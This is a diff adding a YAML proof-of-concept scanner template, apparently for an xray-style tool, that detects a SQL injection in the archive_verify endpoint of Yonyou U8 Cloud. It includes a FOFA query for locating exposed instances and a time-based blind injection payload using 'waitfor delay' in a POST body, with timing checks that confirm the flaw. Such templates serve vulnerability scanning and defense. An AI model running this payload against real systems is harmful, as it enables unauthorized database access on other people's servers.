@@ -1,0 +1,38 @@
+id: poc-yaml-yongyou-u8-cloud-archive-verify-sqli
+info:
+  name: 用友 U8 cloud archive_verify SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: app="用友-U8-Cloud"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: POST
+  path: /
+  expression: 'status_code == 200 &&
+
+    contains(body,"http://uclient.yonyou.com")
+
+    '
+- method: POST
+  path: /u8cuapws/rest/archive/verify
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: '{"orgInfo":{"code":"1'';waitfor delay ''0:0:{{.t1}}''--"}}
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"code\":\"9999") &&
+
+    contains(body,"success\":false") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
